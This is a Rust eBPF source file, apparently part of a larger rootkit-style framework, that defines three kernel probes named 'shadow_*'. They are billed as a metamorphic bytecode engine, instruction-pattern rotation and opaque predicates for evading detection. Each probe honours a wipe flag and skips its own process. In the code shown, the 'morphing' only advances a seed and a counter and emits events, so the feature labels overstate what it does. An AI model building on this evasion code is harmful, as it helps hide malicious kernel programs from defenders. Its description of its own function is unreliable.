use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{EventHeader, EVENT_BYTECODE_MORPHED, EVENT_OPAQUE_PREDICATE, EVENT_PATTERN_ROTATED};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 52: Self-Rewriting Bytecode (Metamorphic Engine)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_bpf_prog_morph(ctx: ProbeContext) -> u32 {
    try_bpf_prog_morph(&ctx).unwrap_or_default()
}

fn try_bpf_prog_morph(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { MORPH_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let prog_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let prog_len: u32 = unsafe { bpf_probe_read_kernel((prog_ptr + 48) as *const u32)? };

    let seed = match unsafe { MORPH_SEED.get(0) } {
        Some(&v) => v,
        None => 0x12345678,
    };

    let new_seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1);
    if let Some(slot) = unsafe { MORPH_SEED.get_ptr_mut(0) } {
        unsafe { *slot = new_seed };
    }

    let event = EventHeader {
        event_type: EVENT_BYTECODE_MORPHED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: prog_len as u64,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 53: Instruction Pattern Rotation
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_pattern_rotate(ctx: ProbeContext) -> u32 {
    try_pattern_rotate(&ctx).unwrap_or_default()
}

fn try_pattern_rotate(_ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let current_variant = match unsafe { MORPH_STATE.get(1) } {
        Some(&v) => v,
        None => 0,
    };

    let next_variant = (current_variant + 1) % 4;
    if let Some(slot) = unsafe { MORPH_STATE.get_ptr_mut(1) } {
        unsafe { *slot = next_variant };
    }

    let event = EventHeader {
        event_type: EVENT_PATTERN_ROTATED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: next_variant as u64,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 54: Opaque Predicates
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_opaque_predicate(ctx: ProbeContext) -> u32 {
    try_opaque_predicate(&ctx).unwrap_or_default()
}

fn try_opaque_predicate(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let pred_key: u32 = unsafe { ctx.arg::<u64>(0).ok_or(1i64)? as u32 };

    let pred_val = match unsafe { OPAQUE_PRED_MAP.get(&pred_key) } {
        Some(&v) => v,
        None => return Ok(0),
    };

    // Opaque predicate: x^2 + x is always even (bit 0 == 0)
    let check = pred_val.wrapping_mul(pred_val).wrapping_add(pred_val);
    if check & 1 == 0 {
        let event = EventHeader {
            event_type: EVENT_OPAQUE_PREDICATE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: pred_val,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
